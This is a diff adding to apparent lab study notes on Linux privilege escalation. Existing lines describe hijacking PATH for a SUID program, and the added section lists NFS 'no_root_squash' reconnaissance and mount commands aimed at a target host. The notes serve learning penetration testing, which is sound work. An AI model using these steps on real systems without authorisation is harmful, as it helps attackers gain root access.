@@ -1184,4 +1184,12 @@ int rand(){
 - ``` export PATH=/tmp:$PATH ``` 
 - when a root program "test" with "SUID" bit set, and it calls ``` system("thm") ```, we need to add executable "thm" to $PATH. And it can run as root after "test" executed. 
 
-
+**NFS**
+- Network File Sharing.
+- SSH, Telnet.
+- ``` cat /etc/exports ``` configurations
+- The critical element for this privilege escalation vector is the "no_root_squash" option.
+- ``` showmount -e {targetIP} ``` on attackers`, to check the target opened path
+- ``` mkdir {attacker_path} ```
+- ``` mount -o rw {targetIP}:/{showed open path} {attacker_path} ```
+- 
